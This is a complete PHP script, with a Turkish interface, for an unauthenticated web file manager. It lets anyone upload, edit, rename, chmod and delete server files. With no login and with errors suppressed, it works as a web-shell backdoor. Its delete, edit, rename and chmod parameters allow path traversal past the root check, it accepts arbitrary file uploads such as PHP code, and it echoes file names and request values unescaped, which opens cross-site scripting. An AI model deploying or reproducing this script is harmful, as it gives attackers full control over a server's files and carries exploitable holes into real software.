<?php
error_reporting(0);
clearstatcache();

$root = getcwd();
$path = isset($_GET['d']) ? realpath($_GET['d']) : $root;

// Güvenlik check: Root altına inilmesini engelle (opsiyonel)
if (!$path || !is_dir($path) || strpos($path, $root) === false) {
    $path = $root;
}

// MESAJ SİSTEMİ
$msg = "";

// DOSYA SİLME
if (isset($_GET['delete'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_dir($target)) {
        rmdir($target); // Klasör boşsa siler
    } else {
        unlink($target);
    }
    header("Location: ?d=$path");
}

// YENİ DOSYA/KLASÖR OLUŞTURMA
if (isset($_POST['new_name'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if ($_POST['type'] == 'dir') {
        mkdir($target);
    } else {
        file_put_contents($target, '');
    }
    header("Location: ?d=$path");
}

// DOSYA YÜKLEME (UPLOAD)
if (isset($_FILES['u_file'])) {
    if (move_uploaded_file($_FILES['u_file']['tmp_name'], $path . DIRECTORY_SEPARATOR . $_FILES['u_file']['name'])) {
        $msg = "Yüklendi.";
    } else {
        $msg = "Hata oluştu.";
    }
}

// YENİDEN ADLANDIRMA (RENAME)
if (isset($_POST['old_name']) && isset($_POST['rename_to'])) {
    rename($path . DIRECTORY_SEPARATOR . $_POST['old_name'], $path . DIRECTORY_SEPARATOR . $_POST['rename_to']);
    header("Location: ?d=$path");
}

// İZİN DEĞİŞTİRME (CHMOD)
if (isset($_POST['chmod_val'])) {
    chmod($path . DIRECTORY_SEPARATOR . $_POST['chmod_file'], octdec($_POST['chmod_val']));
    header("Location: ?d=$path");
}

// DOSYA DÜZENLEME (EDIT)
if (isset($_POST['edit_content'])) {
    file_put_contents($path . DIRECTORY_SEPARATOR . $_POST['edit_file'], $_POST['edit_content']);
    $msg = "Kaydedildi.";
}

?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; padding: 20px; font-size: 13px; }
        a { color: #888; text-decoration: none; }
        a:hover { color: #fff; border-bottom: 1px solid #fff; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { text-align: left; padding: 10px; border: 1px solid #222; }
        th { background: #111; color: #aaa; }
        input, select, textarea { background: #000; color: #0f0; border: 1px solid #333; padding: 5px; font-family: monospace; }
        .btn { cursor: pointer; background: #111; color: #fff; border: 1px solid #444; padding: 5px 10px; }
        .btn:hover { background: #fff; color: #000; }
        .edit-area { width: 100%; height: 400px; margin-top: 10px; }
        .modal { background: #000; border: 1px solid #fff; padding: 20px; margin-bottom: 20px; }
    </style>
    <title>PHP CRUD Manager</title>
</head>
<body>
    <h3>Dizin: <?php echo $path; ?></h3>
    <p style="color: #0f0;"><?php echo $msg; ?></p>
    
    <div style="border: 1px solid #222; padding: 15px; margin-bottom: 10px;">
        <form method="POST" style="display:inline-block; margin-right: 20px;">
            <strong>[+] Yeni:</strong>
            <input type="text" name="new_name" placeholder="isim" required>
            <select name="type">
                <option value="file">Dosya</option>
                <option value="dir">Klasör</option>
            </select>
            <input type="submit" class="btn" value="Oluştur">
        </form>

        <form method="POST" enctype="multipart/form-data" style="display:inline-block;">
            <strong>[^] Yükle:</strong>
            <input type="file" name="u_file" required>
            <input type="submit" class="btn" value="Upload">
        </form>
    </div>

    <?php 
    // DOSYA DÜZENLEME MODU (UI)
    if (isset($_GET['edit'])): 
        $fileToEdit = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
        $content = htmlspecialchars(file_get_contents($fileToEdit));
    ?>
    <div class="modal">
        <strong>Düzenle: <?php echo $_GET['edit']; ?></strong> | <a href="?d=<?php echo $path; ?>">[Kapat]</a>
        <form method="POST">
            <input type="hidden" name="edit_file" value="<?php echo $_GET['edit']; ?>">
            <textarea name="edit_content" class="edit-area"><?php echo $content; ?></textarea><br>
            <input type="submit" class="btn" value="Değişiklikleri Kaydet">
        </form>
    </div>
    <?php endif; ?>

    <table>
        <thead>
            <tr>
                <th>Ad</th>
                <th>Tür</th>
                <th>Boyut</th>
                <th>Yetki (Chmod)</th>
                <th>İşlemler</th>
            </tr>
        </thead>
        <tbody>
            <tr><td><a href="?d=<?php echo dirname($path); ?>">.. (Geri)</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr>
            <?php
            $items = scandir($path);
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                $isDir = is_dir($fullPath);
                $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
                $size = $isDir ? "-" : round(filesize($fullPath) / 1024, 2) . " KB";

                echo "<tr>
                    <td>" . ($isDir ? "<a href='?d=$fullPath'>[ $item ]</a>" : $item) . "</td>
                    <td>" . ($isDir ? "Klasör" : "Dosya") . "</td>
                    <td>$size</td>
                    <td>
                        <form method='POST' style='display:inline;'>
                            <input type='hidden' name='chmod_file' value='$item'>
                            <input type='text' name='chmod_val' value='$perms' size='4'>
                            <input type='submit' class='btn' style='font-size:9px' value='Set'>
                        </form>
                    </td>
                    <td>
                        <a href='?d=$path&edit=$item'>[Düzenle]</a> | 
                        <a href='#' onclick=\"var n=prompt('Yeni isim:','$item'); if(n) { document.getElementById('r_$item').value=n; document.getElementById('f_$item').submit(); }\">[Adlandır]</a> |
                        <a href='?d=$path&delete=$item' style='color: #f44;' onclick=\"return confirm('Silmek istiyor musun?')\">[Sil]</a>
                        
                        <form id='f_$item' method='POST' style='display:none;'>
                            <input type='hidden' name='old_name' value='$item'>
                            <input type='hidden' name='rename_to' id='r_$item'>
                        </form>
                    </td>
                </tr>";
            }
            ?>
        </tbody>
    </table>

    <p style="margin-top: 30px; color: #333; font-size: 11px;">Minimal PHP File Manager - v2.0 CRUD Edition</p>
</body>
</html>
